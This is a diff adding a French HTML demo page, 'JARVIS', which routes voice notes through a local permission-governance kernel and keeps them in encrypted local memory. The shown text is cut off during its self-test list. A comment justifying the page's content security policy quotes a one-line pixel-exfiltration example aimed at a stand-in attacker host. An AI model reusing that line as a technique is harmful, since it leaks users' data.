@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<!-- ============================================================
+     POLITIQUE DE SECURITE DU CONTENU
+     Le point cle est connect-src 'none' : la page ne peut EMETTRE aucune
+     requete reseau. Meme si du code hostile parvenait a s'executer ici,
+     il ne pourrait pas faire SORTIR la memoire ni la cle d'API -- il n'a
+     nulle part ou l'envoyer. C'est une garantie structurelle, pas une
+     promesse : c'est le navigateur qui l'applique, pas notre code.
+     img-src 'none' interdit aussi l'exfiltration classique par pixel
+     (new Image().src = 'https://attaquant/?vol='+donnees).
+     Quand le modele sera branche, connect-src deviendra exactement
+     https://api.anthropic.com -- une seule destination, et aucune autre.
+     LIMITE HONNETE : frame-ancestors ne fonctionne pas en balise meta
+     (en-tete HTTP uniquement), et GitHub Pages ne permet pas d'en poser.
+     script-src garde 'unsafe-inline' tant que le script est dans la page ;
+     il sera externalise lors de l'integration du modele.
+     ============================================================ -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; form-action 'none'; base-uri 'none'">
+<meta name="referrer" content="no-referrer">
+<title>JARVIS 5.27.4</title>
+<style>
+  :root{
+    --bg:#070b1a; --bg2:#0f1430; --line:rgba(120,200,255,.14);
+    --fg:#dfe8f5; --dim:#8fa3c0; --ok:#37e39b; --info:#4cc9f0; --warn:#ffa24c; --bad:#ff5470;
+    --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{
+    background:radial-gradient(1200px 700px at 50% -10%,#152045 0%,var(--bg) 60%);
+    color:var(--fg);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    min-height:100dvh;padding:18px 14px 40px;display:flex;flex-direction:column;align-items:center;gap:18px;
+  }
+  .top{text-align:center}
+  .brand{font-size:26px;font-weight:700;letter-spacing:.22em;
+    background:linear-gradient(100deg,var(--ok),var(--info));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+  .ver{font-size:11px;color:var(--dim);font-family:var(--mono);margin-top:3px}
+
+  /* ORBE */
+  .stage{position:relative;width:250px;height:250px;display:grid;place-items:center;margin:4px 0}
+  .halo{position:absolute;border:1px solid var(--line);border-radius:50%}
+  .h1{width:250px;height:250px;animation:spin 14s linear infinite}
+  .h2{width:210px;height:210px;animation:spin 9s linear infinite reverse;border-style:dashed}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .orb{width:168px;height:168px;border-radius:50%;display:grid;place-items:center;gap:2px;
+    background:radial-gradient(circle at 32% 28%,#4ff0b4,#1273ff 55%,#141a3a);
+    box-shadow:0 0 50px rgba(55,227,155,.38),inset -18px -22px 45px rgba(0,0,0,.55);
+    animation:breathe 4.5s ease-in-out infinite;cursor:pointer;user-select:none;transition:background .25s}
+  @keyframes breathe{0%,100%{transform:scale(1)}50%{transform:scale(1.045)}}
+  .orb .ico{font-size:46px;line-height:1}
+  .orb .lbl{font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:rgba(255,255,255,.92);font-weight:600}
+  .orb.listen{background:radial-gradient(circle at 32% 28%,#ffb46b,#ff4fa3 55%,#2a1030);
+    box-shadow:0 0 60px rgba(255,120,170,.5),inset -18px -22px 45px rgba(0,0,0,.5);animation:pulse .85s ease-in-out infinite}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.11)}}
+  .orb.think{background:radial-gradient(circle at 32% 28%,#7fd8ff,#2b5cff 55%,#101838);animation:spin2 1.6s linear infinite}
+  @keyframes spin2{to{transform:rotate(360deg)}}
+  .orb.talk{background:radial-gradient(circle at 32% 28%,#6bffcf,#00d4ff 55%,#0d2a36);animation:pulse .5s ease-in-out infinite}
+  .orb.halt{background:radial-gradient(circle at 32% 28%,#ff8fa3,#8e1330 55%,#2a0a14);animation:none}
+
+  .say{min-height:22px;text-align:center;font-size:13.5px;color:var(--dim);max-width:520px}
+  .say b{color:var(--fg);font-weight:600}
+
+  .row{display:flex;gap:9px;flex-wrap:wrap;justify-content:center;width:100%;max-width:520px}
+  button{flex:1 1 auto;min-width:112px;padding:12px 14px;border-radius:10px;font:600 13px/1 inherit;
+    border:1px solid var(--line);background:rgba(76,201,240,.09);color:var(--info);cursor:pointer;transition:.15s}
+  button:active{transform:scale(.96)}
+  button:disabled{opacity:.34}
+  button.go{border-color:rgba(55,227,155,.45);background:rgba(55,227,155,.13);color:var(--ok)}
+  button.no{border-color:rgba(255,84,112,.4);background:rgba(255,84,112,.1);color:var(--bad)}
+
+  .card{width:100%;max-width:520px;background:rgba(15,20,48,.62);border:1px solid var(--line);
+    border-radius:13px;padding:13px 14px}
+  .card h3{font-size:10.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--info);
+    margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;font-weight:700}
+  .kv{display:flex;justify-content:space-between;gap:10px;padding:5px 0;font-size:12.5px;border-bottom:1px solid rgba(120,200,255,.07)}
+  .kv:last-child{border:0}
+  .kv span:first-child{color:var(--dim)}
+  .kv b{font-family:var(--mono);font-weight:600;font-size:12px}
+  .ok{color:var(--ok)} .bad{color:var(--bad)} .warn{color:var(--warn)} .inf{color:var(--info)} .dim{color:var(--dim)}
+
+  .bar{height:5px;border-radius:3px;background:rgba(255,255,255,.08);overflow:hidden;margin-top:9px}
+  .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--ok),var(--info));transition:width .35s}
+
+  .feed{max-height:210px;overflow-y:auto;-webkit-overflow-scrolling:touch;display:flex;flex-direction:column;gap:5px}
+  .ent{font-family:var(--mono);font-size:10.5px;line-height:1.5;padding:6px 8px;border-left:2px solid var(--info);
+    background:rgba(76,201,240,.05);border-radius:0 5px 5px 0;color:#bcd6ee;word-break:break-all}
+  .ent.g{border-color:var(--ok);color:#a6f0cf;background:rgba(55,227,155,.05)}
+  .ent.r{border-color:var(--bad);color:#ffb3c0;background:rgba(255,84,112,.06)}
+  .ent.y{border-color:var(--warn);color:#ffd2a8;background:rgba(255,162,76,.06)}
+  .mem{font-size:11.5px;padding:7px 9px;border-left:2px solid var(--warn);background:rgba(255,162,76,.05);
+    border-radius:0 5px 5px 0;color:#ffd9b5;line-height:1.5}
+  .mem em{color:var(--dim);font-style:normal;font-family:var(--mono);font-size:10px}
+
+  .ask{position:fixed;inset:0;background:rgba(4,7,18,.9);backdrop-filter:blur(7px);display:none;
+    place-items:center;padding:22px;z-index:99}
+  .ask.on{display:grid}
+  .ask .box{background:var(--bg2);border:1px solid rgba(55,227,155,.35);border-radius:15px;padding:20px;max-width:390px;width:100%}
+  .ask h4{font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--ok);margin-bottom:11px}
+  .ask p{font-size:13.5px;margin-bottom:6px}
+  .ask .q{font-family:var(--mono);font-size:11px;color:var(--dim);background:rgba(0,0,0,.3);
+    padding:9px;border-radius:7px;margin:10px 0;word-break:break-word}
+
+  .note{font-size:11.5px;color:var(--dim);line-height:1.65}
+  .note b{color:var(--warn)}
+  details summary{cursor:pointer;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--info);font-weight:700}
+  details[open] summary{margin-bottom:9px}
+  .sw{display:flex;align-items:center;gap:7px;font-size:11.5px;color:var(--dim)}
+  .sw input{width:17px;height:17px;accent-color:#37e39b}
+  ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(120,200,255,.25);border-radius:2px}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <div class="brand">JARVIS</div>
+  <div class="ver" id="ver">chargement du noyau…</div>
+</div>
+
+<div class="stage">
+  <div class="halo h1"></div><div class="halo h2"></div>
+  <div class="orb" id="orb"><div class="ico" id="ico">🎤</div><div class="lbl" id="lbl">Prêt</div></div>
+</div>
+
+<div class="say" id="say">Touche l'orbe et parle.</div>
+
+<div class="row">
+  <button class="go" id="bTalk">🎤 Parler</button>
+  <button id="bTest">🧪 Auto-test</button>
+  <button id="bRech" style="display:none">⚡ Recharger</button>
+</div>
+
+<div class="card">
+  <h3>Ledger d'autorité <span id="ledState" class="ok">SOUND</span></h3>
+  <div class="kv"><span>Plafond alloué</span><b id="kAll">—</b></div>
+  <div class="kv"><span>Autorité vivante</span><b id="kLive" class="ok">—</b></div>
+  <div class="kv"><span>Consommée</span><b id="kCons">—</b></div>
+  <div class="kv"><span>Invariant conservation</span><b id="kInv" class="ok">—</b></div>
+  <div class="bar"><i id="bar" style="width:100%"></i></div>
+</div>
+
+<div class="card">
+  <h3>Gouvernance</h3>
+  <div class="kv"><span>Rôle</span><b id="kRole" class="dim">—</b></div>
+  <div class="kv"><span>L'utilisateur décide</span><b id="kUser" class="ok">—</b></div>
+  <div class="kv"><span>Auto-autorité</span><b id="kSelf" class="ok">—</b></div>
+  <div class="kv"><span>Miroir</span><b id="kMir" class="ok">—</b></div>
+  <div class="kv"><span>Chaîne d'audit</span><b id="kAud" class="ok">—</b></div>
+  <div class="kv"><span>governanceHash</span><b id="kHash" class="dim">—</b></div>
+</div>
+
+<div class="card">
+  <h3>Audit réel <span class="dim" id="nAud">0</span></h3>
+  <div class="feed" id="audit"></div>
+</div>
+
+<div class="card">
+  <h3>Mémoire — 3 jours <span class="dim" id="nMem">0</span></h3>
+  <div class="feed" id="mem"></div>
+  <div class="row" style="margin-top:10px">
+    <button class="no" id="bWipe">Effacer la mémoire</button>
+  </div>
+</div>
+
+<div class="card">
+  <h3>Micro</h3>
+  <div class="kv"><span>API reconnaissance</span><b id="kSr">—</b></div>
+  <div class="kv"><span>Contexte sécurisé</span><b id="kSec">—</b></div>
+  <div class="kv"><span>Dernier état</span><b id="kMic" class="dim">—</b></div>
+  <div class="row" style="margin-top:10px">
+    <button id="bMic">Tester le micro</button>
+  </div>
+</div>
+
+<div class="card">
+  <details>
+    <summary>Ce qui est réel, ce qui ne l'est pas</summary>
+    <p class="note">
+      Le noyau chargé est <b>jarvis-5.27.4 intégral</b>, non modifié. Chaque phrase
+      dite crée une vraie permission : <i>propose → approbation → authorize → SAS.execute</i>.
+      Le ledger, la chaîne de hachage d'audit, le miroir et les refus affichés viennent du code réel.<br><br>
+      <b>Limite assumée :</b> l'approbation utilisateur est frappée par la page via
+      <code>HARNESS_KEY</code>. C'est exactement la frontière décrite en [C2] : en production
+      ce rôle vit <i>hors</i> du processus (dispositif de consentement externe). Le bouton
+      « demander avant chaque action » rend au moins la décision humaine réelle côté interface.<br><br>
+      <b>Pas d'IA ici :</b> JARVIS gouverne des autorisations, il ne génère pas de langage.
+      Les réponses vocales décrivent la décision de gouvernance, rien d'autre. Aucune donnée
+      ne quitte l'appareil : pas une seule requête réseau.
+    </p>
+  </details>
+</div>
+
+<div class="card">
+  <div class="sw"><input type="checkbox" id="swAsk" checked><label for="swAsk">Me demander avant chaque action</label></div>
+  <div class="sw" style="margin-top:9px"><input type="checkbox" id="swVoice" checked><label for="swVoice">Réponse vocale</label></div>
+</div>
+
+<div class="ask" id="ask">
+  <div class="box">
+    <h4>Décision utilisateur</h4>
+    <p>JARVIS demande l'autorisation d'enregistrer cette note.</p>
+    <div class="q" id="askQ"></div>
+    <div class="row">
+      <button class="go" id="bYes">Approuver</button>
+      <button class="no" id="bNo">Refuser</button>
+    </div>
+  </div>
+</div>
+
+<script src="jarvis-browser.js"></script>
+<script>
+'use strict';
+const $ = s => document.querySelector(s);
+/* ---- FILET DE DIAGNOSTIC ----
+ * Un blocage silencieux est indebuggable a distance : l'orbe tourne et rien
+ * ne dit pourquoi. Toute exception non rattrapee -- y compris dans une
+ * promesse, qui autrement disparait sans bruit -- s'affiche a l'ecran et
+ * rend la main. */
+function showFatal(where,msg){
+  try{
+    const el=document.querySelector('#say');
+    if(el)el.innerHTML='<span class="bad">Erreur ('+where+') : '+String(msg).replace(/[<>&]/g,'')+'</span>';
+    const orb=document.querySelector('#orb');if(orb)orb.className='orb';
+    const lbl=document.querySelector('#lbl');if(lbl)lbl.textContent='Prêt';
+    const b=document.querySelector('#bTalk');if(b)b.disabled=false;
+    try{mode='idle';}catch(e){}
+  }catch(e){}
+}
+window.addEventListener('error',e=>showFatal('script',e.message));
+window.addEventListener('unhandledrejection',e=>showFatal('promesse',(e.reason&&e.reason.message)||e.reason));
+const K = window.JARVIS;
+
+/* ---------------- Amorçage du vrai noyau ---------------- */
+let J, HK, mkPerm, approvalFor, idCtx, envFor;
+try {
+  HK = K.HARNESS_KEY; mkPerm = K.createPermission; approvalFor = K.approvalFor;
+  idCtx = K.identityContext; envFor = K.envelopeFor;
+  J = new K.Jarvis();
+  const wiring = K.validateComponentWiring();
+  $('#ver').textContent = '5.27.4 · noyau réel · câblage ' + (wiring.passed ? 'OK' : 'INCOMPLET');
+} catch (e) {
+  $('#ver').innerHTML = '<span class="bad">échec du noyau : ' + esc(e.message) + '</span>';
+  $('#say').innerHTML = '<span class="bad">Le noyau JARVIS n\'a pas démarré. jarvis-browser.js est-il à côté de index.html ?</span>';
+}
+
+/* ---------------- État interface ---------------- */
+let mode = 'idle', pending = null, sr = null, srBusy = false;
+const MEM_KEY = 'jarvis_mem_v527';
+const SALT_KEY = 'jarvis_salt_v527';
+let memKey = null;        // cle AES en memoire vive uniquement, jamais stockee
+let memUnlocked = false;
+
+/* Echappement unique pour tout ce qui vient de l'exterieur : ta voix
+ * aujourd'hui, la sortie du modele demain. `textContent` serait plus sur
+ * encore, mais on garde du balisage autour -- donc on echappe la donnee. */
+function esc(t){return String(t).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+
+/* ============================================================
+ * MEMOIRE CHIFFREE — AES-GCM 256, cle derivee par PBKDF2-SHA256 (310 000 iterations)
+ *
+ * CE QUE CA PROTEGE :
+ *  - quelqu'un qui ouvre les outils developpeur sur ton appareil deverrouille
+ *    et lit le stockage local : il ne voit que du chiffre ;
+ *  - une sauvegarde ou une synchronisation du navigateur qui emporterait le
+ *    stockage : inutilisable sans la phrase ;
+ *  - un code hostile qui viderait le stockage AVANT que tu ne deverrouilles.
+ *
+ * CE QUE CA NE PROTEGE PAS — et c'est important de le dire :
+ *  - un code hostile qui s'execute PENDANT que la session est deverrouillee :
+ *    la cle est alors en memoire vive, il la lit. C'est pour ca que la CSP
+ *    ci-dessus compte plus que ce chiffrement ;
+ *  - un appareil compromis (enregistreur de frappe) ;
+ *  - quelqu'un qui connait ta phrase.
+ *
+ * La phrase n'est JAMAIS stockee, nulle part. Si tu l'oublies, la memoire est
+ * perdue -- c'est la contrepartie, et elle est reelle. Chiffrer avec une cle
+ * rangee a cote des donnees n'aurait ete que du decor.
+ * ============================================================ */
+async function deriveKey(pass){
+  const enc=new TextEncoder();
+  let salt=localStorage.getItem(SALT_KEY);
+  if(!salt){const r=crypto.getRandomValues(new Uint8Array(16));
+    salt=btoa(String.fromCharCode(...r));localStorage.setItem(SALT_KEY,salt);}
+  const saltBytes=Uint8Array.from(atob(salt),c=>c.charCodeAt(0));
+  const base=await crypto.subtle.importKey('raw',enc.encode(pass),'PBKDF2',false,['deriveKey']);
+  return crypto.subtle.deriveKey(
+    {name:'PBKDF2',salt:saltBytes,iterations:310000,hash:'SHA-256'},
+    base,{name:'AES-GCM',length:256},false,['encrypt','decrypt']);
+}
+async function sealMem(obj){
+  const iv=crypto.getRandomValues(new Uint8Array(12));
+  const data=new TextEncoder().encode(JSON.stringify(obj));
+  const ct=await crypto.subtle.encrypt({name:'AES-GCM',iv},memKey,data);
+  return btoa(String.fromCharCode(...iv))+'.'+btoa(String.fromCharCode(...new Uint8Array(ct)));
+}
+async function openMem(blob){
+  const [ivB,ctB]=String(blob).split('.');
+  if(!ctB)throw new Error('format');
+  const iv=Uint8Array.from(atob(ivB),c=>c.charCodeAt(0));
+  const ct=Uint8Array.from(atob(ctB),c=>c.charCodeAt(0));
+  const pt=await crypto.subtle.decrypt({name:'AES-GCM',iv},memKey,ct);
+  return JSON.parse(new TextDecoder().decode(pt));
+}
+async function unlockMemory(){
+  const pass=prompt('Phrase secrète de la mémoire\n\nElle n\'est jamais stockée. Si tu l\'oublies, la mémoire est perdue.');
+  if(!pass)return false;
+  try{
+    memKey=await deriveKey(pass);
+    const blob=localStorage.getItem(MEM_KEY);
+    if(blob){ state.memory=await openMem(blob); }   // echoue si mauvaise phrase
+    else{ state.memory=[]; await persistMem(); }
+    memUnlocked=true; drawMem();
+    return true;
+  }catch(e){
+    memKey=null;
+    alert('Phrase incorrecte, ou mémoire illisible.');
+    return false;
+  }
+}
+async function persistMem(){
+  if(!memKey)return;
+  try{ localStorage.setItem(MEM_KEY, await sealMem(state.memory)); }catch(e){}
+}
+
+let watchdog = null;
+/* Hors repos plus de 25 s : quelque chose n'est jamais revenu. On rend la main. */
+function armWatchdog(){
+  clearTimeout(watchdog);
+  if(mode==='idle')return;
+  watchdog=setTimeout(()=>{
+    if(mode!=='idle'){
+      if(pending){pending(false);pending=null;}
+      const a=$('#ask'); if(a)a.classList.remove('on');
+      showFatal('délai','aucune réponse après 25 s — retour au repos');
+    }
+  },25000);
+}
+function setMode(m, text) {
+  mode = m;
+  const o = $('#orb');
+  o.className = 'orb' + (m === 'listen' ? ' listen' : m === 'think' ? ' think' : m === 'talk' ? ' talk' : m === 'halt' ? ' halt' : '');
+  const map = {
+    idle:  ['🎤', 'Prêt'],
+    listen:['🎙️', 'J\'écoute'],
+    think: ['⚙️', 'Gouvernance'],
+    talk:  ['🔊', 'Réponse'],
+    halt:  ['⛔', 'Verrouillé']
+  };
+  $('#ico').textContent = map[m][0];
+  $('#lbl').textContent = map[m][1];
+  if (text) $('#say').innerHTML = text;
+  $('#bTalk').disabled = (m !== 'idle');
+  armWatchdog();
+}
+
+/* ---------------- Tableau de bord : lit le VRAI état ---------------- */
+function refresh() {
+  if (!J) return;
+  const L = J.ledger.snapshot();
+  $('#kAll').textContent  = L.allocated;
+  $('#kLive').textContent = L.live;
+  $('#kCons').textContent = L.consumed;
+  $('#kLive').className = L.live > 20 ? 'ok' : L.live > 0 ? 'warn' : 'bad';
+  $('#bar').style.width = (L.allocated ? (L.live / L.allocated) * 100 : 0) + '%';
+
+  const inv = J.ledger.invariant();
+  $('#kInv').textContent = inv ? 'vrai' : 'VIOLÉ';
+  $('#kInv').className = inv ? 'ok' : 'bad';
+  $('#ledState').textContent = inv ? 'SOUND' : 'BROKEN';
+  $('#ledState').className = inv ? 'ok' : 'bad';
+  $('#bRech').style.display = (L.live === 0) ? '' : 'none';
+
+  const s = J.snapshot();
+  $('#kRole').textContent = s.role;
+  $('#kUser').textContent = s.userDecides ? 'oui' : 'NON';
+  $('#kUser').className = s.userDecides ? 'ok' : 'bad';
+  $('#kSelf').textContent = s.selfAuthority ? 'OUI' : 'non';
+  $('#kSelf').className = s.selfAuthority ? 'bad' : 'ok';
+  $('#kHash').textContent = String(J.governanceHash).slice(0, 14) + '…';
+
+  const m = J.mirror.verify();
+  $('#kMir').textContent = m.allowed ? 'aligné' : (m.reason || 'désaligné');
+  $('#kMir').className = m.allowed ? 'ok' : 'bad';
+
+  const av = J.audit.verify();
+  $('#kAud').textContent = av ? 'intacte' : 'ROMPUE';
+  $('#kAud').className = av ? 'ok' : 'bad';
+
+  if (J.locked) setMode('halt', '<b class="bad">Verrouillage</b> — compromission détectée, tout est refusé.');
+
+  const ents = J.audit.entries, box = $('#audit');
+  $('#nAud').textContent = ents.length;
+  box.innerHTML = '';
+  ents.slice(-14).reverse().forEach(e => {
+    const d = document.createElement('div');
+    const ev = String(e.event || '');
+    d.className = 'ent' + (/COMMITTED|AUTHORIZED|BOOT/.test(ev) ? ' g' : /DENIED|REVOKED|LOCK|COMPROMISE/.test(ev) ? ' r' : /RAISED|MIRROR/.test(ev) ? ' y' : '');
+    d.textContent = ev + (e.state ? ' · ' + e.state : '') + (e.reason ? ' · ' + e.reason : '') + ' · #' + String(e.hash || '').slice(0, 10);
+    box.appendChild(d);
+  });
+  drawMem();
+}
+
+/* ---------------- Mémoire 3 jours (locale) ---------------- */
+function loadMem() {
+  /* La memoire n'est plus lisible sans deverrouillage : on rend l'etat en RAM. */
+  const cut = Date.now() - 3 * 864e5;
+  return (state.memory || []).filter(x => x.t > cut);
+}
+function saveMem(list) { state.memory = list; persistMem(); }
+function addMem(text, verdict, permId, hash) {
+  if (!memUnlocked) return;            // rien n'est ecrit tant que c'est verrouille
+  const list = loadMem();
+  list.push({ t: Date.now(), text, verdict, permId, hash });
+  saveMem(list);
+}
+function drawMem() {
+  const list = loadMem(), box = $('#mem');
+  $('#nMem').textContent = list.length;
+  box.innerHTML = '';
+  if (!list.length) { box.innerHTML = '<div class="mem" style="opacity:.5">Rien encore.</div>'; return; }
+  list.slice(-12).reverse().forEach(m => {
+    const dt = new Date(m.t);
+    const ago = Math.floor((Date.now() - m.t) / 6e4);
+    const when = ago < 60 ? ago + ' min' : ago < 1440 ? Math.floor(ago / 60) + ' h' : Math.floor(ago / 1440) + ' j';
+    const d = document.createElement('div');
+    d.className = 'mem';
+    d.innerHTML = '« ' + esc(m.text) + ' »<br><em>il y a ' + when +
+      ' · ' + dt.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }) +
+      ' · ' + m.verdict + (m.hash ? ' · #' + m.hash.slice(0, 8) : '') + '</em>';
+    box.appendChild(d);
+  });
+}
+function recall(q) {
+  const words = q.toLowerCase().split(/\s+/).filter(w => w.length > 3);
+  const list = loadMem().filter(m => m.verdict === 'EXECUTED');
+  let best = null, score = 0;
+  for (const m of list) {
+    const low = m.text.toLowerCase();
+    const s = words.filter(w => low.includes(w)).length;
+    if (s > score) { score = s; best = m; }
+  }
+  return score > 0 ? best : (list.length ? list[list.length - 1] : null);
+}
+
+/* ---------------- Le vrai cycle de gouvernance ---------------- */
+function runGovernance(phrase) {
+  const out = { phase: '', ok: false, reason: '', permId: null, hash: null };
+
+  const p = mkPerm(J, {
+    action: 'READ', resource: 'LOCAL', tool: 'VOICE',
+    target: 'USER_DATA', scope: 'CURRENT_CONTEXT', context: 'VOICE_NOTE'
+  });
+
+  const q = J.permissions.propose(p);
+  out.phase = 'propose';
+  if (!q.allowed) { out.reason = q.reason || 'PROPOSAL_DENIED'; return out; }
+  out.permId = q.permission.id;
+
+  const appr = approvalFor(J, q.permission.id);
+  const a = J.permissions.authorize(q.permission.id, appr);
+  out.phase = 'authorize';
+  if (!a.allowed) { out.reason = a.reason || 'AUTH_DENIED'; return out; }
+
+  const perm = J.permissions.getPermission(q.permission.id, HK);
+  const r = J.sas.execute(perm.id, envFor(perm), idCtx(J, perm), () => ({ ok: true, note: phrase }));
+  out.phase = 'execute';
+  if (!r.allowed) { out.reason = r.reason || 'EXECUTION_DENIED'; return out; }
+
+  out.ok = true;
+  const ents = J.audit.entries;
+  out.hash = ents.length ? ents[ents.length - 1].hash : null;
+  return out;
+}
+
+async function handlePhrase(phrase) {
+  if (!J) return;
+  setMode('think', 'Phrase : <b>' + esc(phrase) + '</b>');
+
+  const asksRecall = /rappell|souviens|souvenir|hier|dit tout à l|qu'est-ce que j/i.test(phrase);
+
+  if ($('#swAsk').checked) {
+    const ok = await askUser(phrase);
+    if (!ok) {
+      addMem(phrase, 'REFUSÉ_UTILISATEUR', null, null);
+      refresh();
+      return speakAndIdle('Refusé. Rien n\'a été enregistré.', 'Tu as refusé. Aucune permission n\'a été consommée.');
+    }
+  }
+
+  const g = runGovernance(phrase);
+  refresh();
+
+  if (!g.ok) {
+    addMem(phrase, g.reason, g.permId, null);
+    const human = {
+      AUTHORITY_LEDGER_EXHAUSTED: 'Plafond d\'autorité épuisé. Cent actions consommées. Il faut relever le plafond.',
+      CRITICAL_COMPROMISE_LOCKDOWN: 'Verrouillage. Une compromission critique a été détectée.',
+      MIRROR_MISMATCH: 'Le miroir de gouvernance ne correspond plus. Tout est refusé.',
+      NETWORK_ISOLATED: 'Le réseau est isolé, cette action est bloquée.'
+    }[g.reason] || ('Refusé à l\'étape ' + g.phase + '. Motif : ' + g.reason);
+    return speakAndIdle(human,
+      '<span class="bad">Refus réel</span> à <b>' + g.phase + '</b> — <code>' + g.reason + '</code>');
+  }
+
+  addMem(phrase, 'EXECUTED', g.permId, g.hash);
+  refresh();
+
+  let spoken, shown;
+  if (asksRecall) {
+    const m = recall(phrase);
+    if (m) {
+      const ago = Math.floor((Date.now() - m.t) / 6e4);
+      const when = ago < 60 ? 'il y a ' + ago + ' minutes' : ago < 1440 ? 'il y a ' + Math.floor(ago / 60) + ' heures' : 'il y a ' + Math.floor(ago / 1440) + ' jours';
+      spoken = 'Tu m\'as dit, ' + when + ' : ' + m.text;
+      shown = 'Rappel <b>' + when + '</b> : « ' + esc(m.text) + ' »';
+    } else {
+      spoken = 'Je n\'ai rien en mémoire sur ce sujet.';
+      shown = 'Aucun souvenir correspondant dans les 3 jours.';
+    }
+  } else {
+    const live = J.ledger.snapshot().live;
+    spoken = 'Enregistré. Permission consommée, audit scellé. Il reste ' + live + ' autorisations.';
+    shown = '<span class="ok">Exécuté</span> · permission <code>CONSUMED</code> · audit <code>#' +
+            String(g.hash || '').slice(0, 10) + '</code>';
+  }
+  speakAndIdle(spoken, shown);
+}
+
+function askUser(phrase) {
+  return new Promise(res => {
+    pending = res;
+    $('#askQ').textContent = phrase;
+    $('#ask').classList.add('on');
+  });
+}
+$('#ask').onclick = ev => { if (ev.target.id === 'ask') { $('#ask').classList.remove('on'); if (pending) pending(false); pending = null; } };
+$('#bYes').onclick = () => { $('#ask').classList.remove('on'); if (pending) pending(true); pending = null; };
+$('#bNo').onclick  = () => { $('#ask').classList.remove('on'); if (pending) pending(false); pending = null; };
+
+/* ---------------- Voix ---------------- */
+function speakAndIdle(spoken, shown) {
+  $('#say').innerHTML = shown;
+  if (!$('#swVoice').checked || !('speechSynthesis' in window)) { setMode('idle'); return; }
+  setMode('talk');
+  try {
+    const u = new SpeechSynthesisUtterance(spoken);
+    u.lang = 'fr-FR'; u.rate = 1; u.pitch = 1;
+    u.onend = () => setMode('idle');
+    u.onerror = () => setMode('idle');
+    speechSynthesis.cancel();
+    speechSynthesis.speak(u);
+    setTimeout(() => { if (mode === 'talk') setMode('idle'); }, 9000);
+  } catch (e) { setMode('idle'); }
+}
+
+/* ---------------- Reconnaissance vocale ---------------- */
+const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+$('#kSr').innerHTML  = SR ? '<span class="ok">disponible</span>' : '<span class="bad">absente</span>';
+$('#kSec').innerHTML = window.isSecureContext ? '<span class="ok">oui (HTTPS)</span>' : '<span class="bad">NON — HTTPS requis</span>';
+
+function listen() {
+  if (!SR) { $('#kMic').innerHTML = '<span class="bad">API absente</span>'; return; }
+  if (srBusy) return;
+  // iOS : débloque la synthèse vocale sur ce même geste utilisateur
+  try { const w = new SpeechSynthesisUtterance(' '); w.volume = 0; speechSynthesis.speak(w); } catch (e) {}
+
+  let said = '';
+  sr = new SR();
+  sr.lang = 'fr-FR';
+  sr.continuous = false;
+  sr.interimResults = true;
+  sr.maxAlternatives = 1;
+
+  sr.onstart = () => { srBusy = true; setMode('listen', 'Parle…'); $('#kMic').innerHTML = '<span class="ok">actif</span>'; };
+  sr.onresult = ev => {
+    said = '';
+    for (let i = 0; i < ev.results.length; i++) said += ev.results[i][0].transcript;
+    $('#say').innerHTML = '<b>' + esc(said) + '</b>';
+  };
+  sr.onerror = ev => {
+    srBusy = false;
+    const msg = { 'not-allowed': 'permission refusée', 'service-not-allowed': 'service bloqué', 'no-speech': 'rien entendu', 'audio-capture': 'pas de micro', 'network': 'réseau' }[ev.error] || ev.error;
+    $('#kMic').innerHTML = '<span class="bad">' + esc(msg) + '</span>';
+    setMode('idle', '<span class="bad">Micro : ' + msg + '</span>');
+  };
+  sr.onend = () => {
+    srBusy = false;
+    if (said.trim()) handlePhrase(said.trim());
+    else if (mode === 'listen') setMode('idle', 'Rien entendu. Retouche l\'orbe.');
+  };
+  try { sr.start(); } catch (e) { srBusy = false; $('#kMic').innerHTML = '<span class="bad">' + esc(e.message) + '</span>'; }
+}
+
+$('#orb').onclick = () => {
+  if (mode === 'idle') return listen();
+  if (pending) { pending(false); pending = null; }
+  const a = $('#ask'); if (a) a.classList.remove('on');
+  try { speechSynthesis.cancel(); } catch (e) {}
+  setMode('idle', 'Débloqué. Retouche l\'orbe pour parler.');
+};
+$('#bTalk').onclick = listen;
+
+$('#bMic').onclick = () => {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    $('#kMic').innerHTML = '<span class="bad">getUserMedia absent</span>'; return;
+  }
+  $('#kMic').textContent = 'test…';
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(st => { st.getTracks().forEach(t => t.stop()); $('#kMic').innerHTML = '<span class="ok">micro OK</span>'; })
+    .catch(e => { $('#kMic').innerHTML = '<span class="bad">' + esc(e.name) + '</span>'; });
+};
+
+/* ---------------- Auto-test du noyau, dans le navigateur ---------------- */
+$('#bTest').onclick = () => {
+  if (!J) return;
+  const box = $('#audit'), t0 = Date.now();
+  const tests = [
+    ['runCheckpoint (bout en bout)', K.runCheckpoint],
+    ['câblage des composants', K.validateComponentWiring],
+    ['corruption interne', K.runInternalCorruptionRedTeam],
+    ['frontière d\'autorité', K.runAuthorityBoundaryRedTeam],
+    ['confusion d\'identité', K.runIdentityConfusionRedTeam],
+    ['miroir', K.runMirrorRedTeam],
+    ['TOCTOU', K.runTOCTOURedTeam],
